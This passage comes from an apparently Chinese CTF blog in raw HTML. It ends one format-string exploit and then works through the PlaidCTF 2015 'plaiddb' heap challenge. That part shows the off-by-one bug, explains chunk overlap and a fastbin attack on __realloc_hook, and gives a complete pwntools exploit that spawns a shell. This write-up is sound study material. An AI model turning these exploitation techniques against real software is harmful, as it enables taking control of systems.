p.sendline(str(idx+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(content)</span> :</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>+ <span class="string">'\x00'</span>*<span class="number">7</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    fini_array = <span class="number">0x6011B8</span></span><br><span class="line">    main_addr = <span class="number">0x400A39</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#first step </span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hnQ%&#123;&#125;$pP%&#123;&#125;$p"</span>.format(<span class="number">0xA39</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">28</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    submit(p64(fini_array))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'Q'</span>)</span><br><span class="line">    __libc_start_main_addr = int(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]<span class="number">-240</span></span><br><span class="line">    ret_addr = int(p.recv(<span class="number">15</span>)[<span class="number">1</span>:], <span class="number">16</span>)<span class="number">-0x1e8</span></span><br><span class="line">    one_gadget_offset = <span class="number">0x45216</span> </span><br><span class="line">    <span class="comment">#one_gadget_offset = 0x4526a </span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf02a4</span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + one_gadget_offset</span><br><span class="line">    p.success(<span class="string">"libc_base-&gt; 0x%x"</span> % libc_base)</span><br><span class="line">    p.success(<span class="string">"ret_addr-&gt; 0x%x"</span> % ret_addr)</span><br><span class="line">    p.success(<span class="string">"one_gadget-&gt; 0x%x"</span> % one_gadget)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second step</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    part1 = ((one_gadget&gt;&gt;<span class="number">16</span>)&amp; <span class="number">0xffff</span>)</span><br><span class="line">    part2 = (one_gadget &amp; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">    part =[</span><br><span class="line">        (part1, p64(ret_addr+<span class="number">2</span>)),</span><br><span class="line">        (part2, p64(ret_addr))</span><br><span class="line">    ]</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    size = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> part]</span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    print(size)</span><br><span class="line">    print(addr)</span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">0</span>], <span class="number">13</span>)</span><br><span class="line">    fmstr += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">1</span>]-size[<span class="number">0</span>], <span class="number">14</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    submit(addr)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3. 总结"></a>1.3. 总结</h2><ol>
<li>这道题堆部分难点部分想到了就不难，没想到就难，就是要利用那个部分溢出到第三个堆块</li>
<li>其余部分就全是格式化字符串的利用了，没什么好讲的</li>
<li>这道题拿到shell也偏废时间，最主要直接看exp我看不懂，后面去看文章才看懂的</li>
</ol>
<h2 id="1-4-参考链接"><a href="#1-4-参考链接" class="headerlink" title="1.4. 参考链接"></a>1.4. 参考链接</h2><p><a href="https://bbs.pediy.com/thread-246783.htm" target="_blank" rel="noopener">看雪大佬的文章</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-2/" itemprop="url">pwn/pwn-heap-learn-2</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn堆入门系列教程2"><a href="#pwn堆入门系列教程2" class="headerlink" title="pwn堆入门系列教程2"></a>pwn堆入门系列教程2</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">堆入门系列教程1</a><br>序言：第二题，研究了两天，其中有小猪师傅，m4x师傅，萝卜师傅等各个师傅指点我，这次又踩了几个坑，相信以后不会再犯，第二题感觉比第一题复杂许多，不是off-by-one的问题，是这种攻击方式的问题，这种攻击方式十分精妙，chunk overlap，堆块重叠，这种攻击方式我也是第一次见，复现起来难度也是有滴</p>
<h2 id="off-by-one第二题"><a href="#off-by-one第二题" class="headerlink" title="off-by-one第二题"></a>off-by-one第二题</h2><p>此题也是off-by-one里的一道题目，让我再次意识到off by one在堆里的强大之处</p>
<h2 id="plaidctf-2015-plaiddb"><a href="#plaidctf-2015-plaiddb" class="headerlink" title="plaidctf 2015 plaiddb"></a>plaidctf 2015 plaiddb</h2><p>前面的功能分析和数据结构分析我就不再做了，ctf-wiki上给的清楚了，然后网上各种wp也给的清楚了，我没逆向过红黑树，也没写过，所以具体结构我也不清楚，照着师傅们的来，确实是树</p>
<p>数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *key;</span><br><span class="line">    <span class="keyword">long</span> data_size;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">right</span>;</span></span><br><span class="line">    <span class="keyword">long</span> dummy;</span><br><span class="line">    <span class="keyword">long</span> dummy1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数存在off-by-one</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_1040</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = malloc_usable_size(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      sub_1020();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v1 - v0;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v1 - v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">realloc</span>(v0, <span class="number">2</span> * v2);</span><br><span class="line">      v0 = v6;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"FATAL: Out of memory"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;v6[v5];</span><br><span class="line">      v2 = malloc_usable_size(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    *v1++ = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *v1 = <span class="number">0</span>;<span class="comment">//off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后师傅们利用堆块的重叠进行泄露地址，然后覆盖fd指针，然后fastbin attack，简单的说就是这样，先说明下整体攻击过程</p>
<ol>
<li>先删掉初始存在的堆块 th3fl4g，方便后续堆的布置及对齐</li>
<li>创建堆块，为后续做准备在创建同key堆块的时候，会删去上一个同key堆块</li>
<li>利用off-by-one覆盖下个chunk的pre_size，这里必须是0x18,0x38,0x78这种递增的，他realloc是按倍数递增的，如果我们用了0x18大小的key的话，会将下一个chunk的pre_size部分当数据块来用，在加上off-by-one覆盖掉size的insue位</li>
<li>先free掉第一块，为后续大堆块做准备</li>
<li>然后free第三块，这时候会向后合并堆块，根据pre_size合并成大堆块造成堆块重叠，这时候可以泄露地址了</li>
<li>申请堆块填充空间至chunk2</li>
<li>chunk2上为main_arena，泄露libc地址</li>
<li>现在堆块是重叠的，chunk3在我们free后的大堆块里，然后修改chunk3的fd指针指向realloc_hook</li>
<li>不破坏现场(不容易)</li>
<li>malloc一次，在malloc一次，这里有个点要注意，需要错位伪造size，因为fastbin有个checksize，我们这里将前面的0x7f错位，后面偏移也要补上</li>
<li>最后改掉后，在调用一次getshell</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'datastore'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(key)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"GET"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUT</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"PUT"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter data size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter data:"</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DUMP</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"DUMP"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEL</span><span class="params">(key)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"DEL"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    realloc_hook_off = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">    DEL(<span class="string">"th3fl4g"</span>)</span><br><span class="line"></span><br><span class="line">    PUT(<span class="string">"1"</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x80</span>)</span><br><span class="line">    PUT(<span class="string">"2"</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x18</span>)</span><br><span class="line">    PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, <span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">    PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, <span class="string">'C'</span>*<span class="number">0xf0</span>)</span><br><span class="line">    PUT(<span class="string">"4"</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, <span class="string">'D'</span>*<span class="number">0x20</span>)  <span class="comment"># off by one</span></span><br><span class="line"></span><br><span class="line">    DEL(<span class="string">"1"</span>*<span class="number">0x8</span>)</span><br><span class="line">    DEL(<span class="string">"3"</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">    DUMP()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"INFO: Dumping all rows.\n"</span>)</span><br><span class="line">    temp = p.recv(<span class="number">11</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3f0</span></span><br><span class="line">    libc_base = int(p.recvline()[<span class="number">3</span>:<span class="number">-7</span>])<span class="number">-0x3be7b8</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">    realloc_hook_addr = libc_base + realloc_hook_off</span><br><span class="line">    log.info(<span class="string">"reallo_hook: 0x%x"</span> % realloc_hook_addr)</span><br><span class="line">    payload = p64(heap_base+<span class="number">0x70</span>)</span><br><span class="line">    payload += p64(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x88</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">    payload += p64(realloc_hook_addr<span class="number">-0x8</span><span class="number">-0x3</span><span class="number">-0x8</span>)</span><br><span class="line">    PUT(<span class="string">"6"</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x290</span>)</span><br><span class="line">    payload += p64(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    PUT(<span class="string">"c"</span>*<span class="number">0x8</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x90</span>)</span><br><span class="line">    payload += p64(<span class="number">0x8</span>)+p64(heap_base+<span class="number">0x230</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    PUT(<span class="string">"d"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    system_addr = libc_base+system_off</span><br><span class="line">    print(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x3</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    payload += p8(<span class="number">0</span>)*(<span class="number">0x4d</span>+<span class="number">0x8</span>)</span><br><span class="line">    PUT(<span class="string">"e"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">    payload = <span class="string">"/bin/sh"</span></span><br><span class="line">    payload += p8(<span class="number">0</span>)*<span class="number">0x12</span> </span><br><span class="line">    GET(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="细节讲解"><a href="#细节讲解" class="headerlink" title="细节讲解"></a>细节讲解</h3><p>我只有exp部分是重点，其余创建堆块动作都是辅助的</p>
<h4 id="堆块重叠"><a href="#堆块重叠" class="headerlink" title="堆块重叠"></a>堆块重叠</h4><p><a href="http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html" target="_blank" rel="noopener">堆叠</a><br>这篇文章讲的很好，图配的也很好，看下这部分就大概知道堆块重叠了<br>而这道题中，这里就是构造堆块重叠部分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">realloc_hook_off = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">"th3fl4g"</span>)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">"1"</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x80</span>)</span><br><span class="line">PUT(<span class="string">"2"</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x18</span>)</span><br><span class="line">PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, <span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, <span class="string">'C'</span>*<span class="number">0xf0</span>)</span><br><span class="line">PUT(<span class="string">"4"</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, <span class="string">'D'</span>*<span class="number">0x20</span>)  <span class="comment"># off by one</span></span><br><span class="line"></span><br><span class="line">DEL(<span class="string">"1"</span>*<span class="number">0x8</span>)</span><br><span class="line">DEL(<span class="string">"3"</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure>
<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">DUMP()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"INFO: Dumping all rows.\n"</span>)</span><br><span class="line">temp = p.recv(<span class="number">11</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3f0</span></span><br><span class="line">libc_base = int(p.recvline()[<span class="number">3</span>:<span class="number">-7</span>])<span class="number">-0x3be7b8</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">realloc_hook_addr = libc_base + realloc_hook_off</span><br><span class="line">log.info(<span class="string">"reallo_hook: 0x%x"</span> % realloc_hook_addr)</span><br></pre></td></tr></table></figure>
<p>第一步put是为了将free掉的chunk移动到2处，这样才好泄露</p>
